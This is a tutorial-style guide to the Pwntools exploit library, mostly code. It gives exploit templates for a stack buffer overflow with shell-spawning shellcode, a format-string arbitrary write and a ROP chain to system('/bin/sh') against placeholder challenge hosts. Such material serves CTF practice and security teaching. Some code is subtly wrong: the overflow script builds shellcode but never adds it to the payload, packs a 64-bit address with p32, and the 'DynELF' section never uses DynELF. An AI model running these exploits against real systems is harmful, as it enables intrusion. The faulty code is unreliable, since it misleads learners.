# Pwntools How-To Guide

Pwntools is a CTF framework and exploit development library that makes it easier to write exploits for binary vulnerabilities.

## Installation

```bash
# On Ubuntu/Debian
sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
pip3 install --upgrade pwntools

# Using Docker (recommended to avoid dependency issues)
docker pull pwntools/pwntools:stable
```

## Basic Pwntools Structure

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
context.log_level = 'debug'  # Options: debug, info, warn, error, critical
context.arch = 'amd64'      # Architecture (i386, amd64, arm, etc.)
context.os = 'linux'        # OS (linux, windows, etc.)

# Connect to service
conn = remote('target.com', 1234)  # For remote challenge
# conn = process('./vulnerable_binary')  # For local binary

# Send/Receive data
conn.sendline(b'payload')
response = conn.recvline()

# Close connection
conn.close()
```

## Real-World Scenario 1: Buffer Overflow Exploitation

**Situation**: You've identified a buffer overflow vulnerability in a network service and need to create an exploit to gain code execution.

**Step-by-Step Process**:

1. **Analyze the vulnerability**:
```bash
# Use checksec to check protections
checksec ./vulnerable_service

# Use gdb to analyze the binary
gdb ./vulnerable_service
(gdb) disas vulnerable_function
(gdb) pattern_create 200
(gdb) run
# ... crash occurs ...
(gdb) print $eip  # Find offset
```

2. **Create the exploit script**:
```python
#!/usr/bin/env python3
from pwn import *

# Configuration
context.log_level = 'debug'
context.arch = 'i386'
context.os = 'linux'

# Connect to target
conn = remote('chall.example.com', 1234)

# Create payload
offset = 140  # Found from analysis
payload = b'A' * offset

# Add NOP sled
payload += asm('nop') * 10

# Add shellcode (execve("/bin/sh", ["/bin/sh"], NULL))
shellcode = asm(shellcraft.sh())

# Add return address (address where shellcode will be)
# This will depend on your specific target
ret_addr = 0x7fffffffe360  # Example address

payload += p32(ret_addr)

# Send payload
conn.sendline(payload)

# Get shell
conn.interactive()

conn.close()
```

## Real-World Scenario 2: Format String Vulnerability Exploitation

**Situation**: You've found a format string vulnerability that allows you to read and write arbitrary memory locations.

**Step 1**: Create a script to read from the stack:
```python
#!/usr/bin/env python3
from pwn import *

# Configuration
context.log_level = 'info'

# Connect to target
conn = process('./format_vuln')  # For local testing
# conn = remote('chall.example.com', 1234)  # For remote

# Leak stack values
payload = b'%x.%x.%x.%x.%x.%x.%x.%x'
conn.sendlineafter(b'Input: ', payload)
response = conn.recvline()
print(f"Stack values: {response}")

# Leak specific addresses using %n to write
# This is complex and depends on target, here's a template:
payload = fmtstr_payload(6, {0x404040: 0x41414141})  # Write 0x41414141 to address 0x404040
conn.sendline(payload)

conn.interactive()
conn.close()
```

## Real-World Scenario 3: Return-Oriented Programming (ROP) Chain

**Situation**: Stack protection is enabled (NX/DEP), so you need to use ROP to bypass the execution protection.

**Step 1**: Find ROP gadgets:
```bash
# Using ropper
ropper --file ./vuln_binary --search "pop rdi"

# Using ROPgadget
ROPgadget --binary ./vuln_binary | grep "pop rdi"
```

**Step 2**: Create ROP exploit:
```python
#!/usr/bin/env python3
from pwn import *

# Configuration
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

# Load binary
binary = ELF('./vuln_binary')
rop = ROP(binary)

# Connect to target
conn = remote('chall.example.com', 1234)

# Build ROP chain to call system("/bin/sh")
# system address
system_addr = binary.symbols['system']
# "/bin/sh" string address
binsh_addr = next(binary.search(b'/bin/sh\x00'))

# Find ROP gadgets
rop.call(system_addr, [binsh_addr])

# Create payload
offset = 72  # From analysis
payload = b'A' * offset
payload += rop.chain()

# Print ROP chain info
print(rop.dump())

# Send payload
conn.sendline(payload)

# Get shell
conn.interactive()

conn.close()
```

## Advanced Pwntools Techniques

**Using DynELF for ASLR bypass**:
```python
#!/usr/bin/env python3
from pwn import *

# For ASLR bypass when no leaks are available
def create_rop_chain():
    conn = remote('target', 1234)
    
    # Leak some data to defeat ASLR
    # This is a template - actual implementation depends on leak type
    leak_payload = b'%7$016llx'  # Leak 7th parameter from stack
    conn.sendline(leak_payload)
    leak = int(conn.recv(16), 16)
    
    # Calculate base addresses using leak
    # ...
    
    conn.close()

# Using cyclic patterns for offset discovery
payload = cyclic(200)
# Run in debugger to find exact offset where EIP is overwritten
```

## Common Pwntools Functions

### Connection Functions
- `remote(host, port)`: Connect to a remote service
- `process(binary)`: Start a local process
- `ssh(user, host, port, password)`: Connect via SSH

### Data Manipulation
- `p32(value)`, `p64(value)`: Pack 32-bit or 64-bit values
- `u32(data)`, `u64(data)`: Unpack 32-bit or 64-bit values
- `flat(*args)`: Flatten arguments into a byte string
- `cyclic(length)`: Create a cyclic pattern for offset discovery

### Assembly and Shellcode
- `asm(code)`: Assemble assembly code
- `shellcraft.*`: Generate shellcode for various platforms
- `MIPS`, `ARM`, `AARCH64` architectures supported

### ELF and Binary Analysis
- `ELF(filename)`: Load an ELF binary
- `binary.symbols['function']`: Get address of a symbol
- `binary.read(address, size)`: Read at a specific address
- `binary.write(address, data)`: Write at a specific address

## Tips and Best Practices

1. **Set appropriate context**: Always set architecture, OS, and log level appropriately
2. **Use debugging**: Set context.log_level = 'debug' to see all communication
3. **Validate addresses**: Check addresses are valid before using them in payloads
4. **Understand protections**: Check for ASLR, DEP, stack canaries, etc.
5. **Test locally first**: Develop exploits against local binaries before remote targets
6. **Handle endianness**: Be aware of little-endian vs big-endian when packing values
7. **Use proper padding**: Ensure payloads are properly aligned for the target architecture

## Troubleshooting Common Issues

- **"Address not mapped"**: Check architecture settings and address validity
- **Shellcode not executing**: Verify no DEP/ASLR issues and proper shellcode positioning
- **Connection issues**: Ensure target is accessible and ports are correct
- **Wrong architecture**: Make sure context.arch matches the target binary
- **Payload not working**: Re-check offset calculation and address alignment
- **Segmentation fault**: Payload might be corrupting important memory structures